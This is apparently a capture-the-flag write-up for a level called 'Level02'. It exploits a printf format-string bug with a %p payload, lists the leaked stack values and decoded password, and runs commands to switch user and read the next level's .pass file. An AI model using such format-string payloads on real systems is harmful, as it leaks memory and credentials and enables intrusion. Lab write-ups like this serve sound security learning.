Level02 - Format String Attack Vulnerability

printf(username) without format string → Leaks stack memory

Solution

Step 1: Leak password from stack
 username = %22$p%23$p%24$p%25$p%26$p

Step 2: Find password at positions 22-26
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d

Step 3: Convert hex to ASCII (reverse order)

Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

su level03 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

# Enter password above
cat /home/users/level03/.pass